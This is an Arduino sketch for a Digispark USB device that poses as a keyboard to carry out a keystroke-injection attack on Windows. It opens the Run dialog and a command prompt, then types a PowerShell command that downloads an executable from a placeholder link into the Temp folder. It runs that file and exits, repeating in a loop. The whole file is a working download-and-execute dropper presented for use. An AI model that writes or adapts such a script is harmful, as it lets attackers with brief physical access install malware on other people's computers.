#include "DigiKeyboard.h"
// all defines were found in https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf page 54 in "Usage ID (Dec)"
#define SHIFT     225  
#define ALT       226    
#define  ENTER    88  
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
delay(1000);
DigiKeyboard.print("");
delay(1000);
DigiKeyboard.sendKeyStroke(SHIFT, ALT);
delay(1000);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
delay(1000);
DigiKeyboard.print("cmd");
delay(500);
DigiKeyboard.sendKeyStroke(ENTER);
delay(500);
DigiKeyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('link on your file','%Temp%/yourfile.exe')");
delay(500);
DigiKeyboard.sendKeyStroke(ENTER);
delay(500);
DigiKeyboard.print("%Temp%/yourfile.exe");
delay(500);
DigiKeyboard.sendKeyStroke(ENTER);
delay(500);
DigiKeyboard.print("exit");
delay(500);
DigiKeyboard.sendKeyStroke(ENTER);
}

